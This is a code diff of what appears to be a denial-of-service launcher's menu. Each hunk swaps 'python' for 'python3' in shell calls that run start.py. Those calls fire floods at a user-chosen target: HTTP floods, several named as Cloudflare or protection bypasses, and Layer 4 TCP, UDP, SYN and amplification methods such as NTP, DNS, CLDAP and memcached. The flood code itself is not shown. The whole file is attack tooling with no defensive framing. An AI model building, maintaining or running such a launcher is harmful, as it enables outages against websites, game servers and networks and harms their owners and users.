@@ -212,7 +212,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py GET {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py GET {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "post":
 
@@ -224,7 +224,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py POST {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py POST {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "ovh":
 
@@ -236,7 +236,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py OVH {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py OVH {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "rhex":
 
@@ -248,7 +248,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py RHEX {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py RHEX {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "stomp":
 
@@ -260,7 +260,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py STOMP {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py STOMP {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "stress":
 
@@ -272,7 +272,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py STRESS {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py STRESS {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "dyn":
 
@@ -284,7 +284,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py DYN {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py DYN {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "downloader":
 
@@ -296,7 +296,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py DOWNLOADER {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py DOWNLOADER {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "slow":
 
@@ -308,7 +308,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py SLOW {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py SLOW {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "head":
 
@@ -320,7 +320,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py HEAD {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py HEAD {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "null":
 
@@ -332,7 +332,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py NULL {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py NULL {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "cookie":
 
@@ -344,7 +344,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py COOKIE {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py COOKIE {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "pps":
 
@@ -356,7 +356,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py PPS {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py PPS {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "even":
 
@@ -368,7 +368,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py EVEN {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py EVEN {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "gsb":
 
@@ -380,7 +380,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py GSB {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py GSB {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "dgb":
 
@@ -392,7 +392,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py DGB {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py DGB {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "avb":
 
@@ -404,7 +404,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py AVB {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py AVB {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "bot":
 
@@ -416,7 +416,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py BOT {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py BOT {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "apache":
 
@@ -428,7 +428,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py APACHE {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py APACHE {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "xmlrpc":
 
@@ -440,7 +440,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py XMLRPC {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py XMLRPC {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "cfb":
 
@@ -452,7 +452,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py CFB {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py CFB {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "cfbuam":
 
@@ -464,7 +464,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py CFBUAM {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py CFBUAM {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "bypass":
 
@@ -476,7 +476,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py BYPASS {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py BYPASS {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "bomb":
 
@@ -488,7 +488,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py BOMB {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py BOMB {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "killer":
 
@@ -500,7 +500,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py KILLER {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py KILLER {target} {socks} {threads} proxy.txt 5 {duration}")
 
         elif inp.lower() == "tor":
 
@@ -512,7 +512,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py TOR {target} {socks} {threads} proxy.txt 5 {duration}")
+            os.system(f"python3 start.py TOR {target} {socks} {threads} proxy.txt 5 {duration}")
 
     #Layer4 METHOD
 
@@ -526,7 +526,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py TCP {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py TCP {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "udp":
 
@@ -538,7 +538,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py UDP {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py UDP {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "syn":
 
@@ -550,7 +550,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py SYN {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py SYN {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "cps":
 
@@ -562,7 +562,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py CPS {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py CPS {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "icmp":
 
@@ -574,7 +574,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py ICMP {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py ICMP {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "connection":
 
@@ -586,7 +586,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py CONNECTION {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py CONNECTION {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "vse":
 
@@ -598,7 +598,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py VSE {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py VSE {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "ts3":
 
@@ -610,7 +610,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py TS3 {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py TS3 {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "fivem":
 
@@ -622,7 +622,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py FIVEM {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py FIVEM {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "mem":
 
@@ -634,7 +634,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py MEM {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py MEM {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "ntp":
 
@@ -646,7 +646,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py NTP {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py NTP {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "mcbot":
 
@@ -658,7 +658,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py MCBOT {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py MCBOT {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "minecraft":
 
@@ -670,7 +670,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py MINECRAFT {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py MINECRAFT {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "dns":
 
@@ -682,7 +682,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py DNS {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py DNS {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "char":
 
@@ -694,7 +694,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py CHAR {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py CHAR {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "cldap":
 
@@ -706,7 +706,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py CLDAP {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py CLDAP {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "ard":
 
@@ -718,7 +718,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py ARD {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py ARD {ip}:{port} {threads} {duration}")
 
         elif inp.lower() == "rdp":
 
@@ -730,7 +730,7 @@ def handle_input():
 
             threads = input("Threads:")
 
-            os.system(f"python start.py RDP {ip}:{port} {threads} {duration}")
+            os.system(f"python3 start.py RDP {ip}:{port} {threads} {duration}")
 
 
 
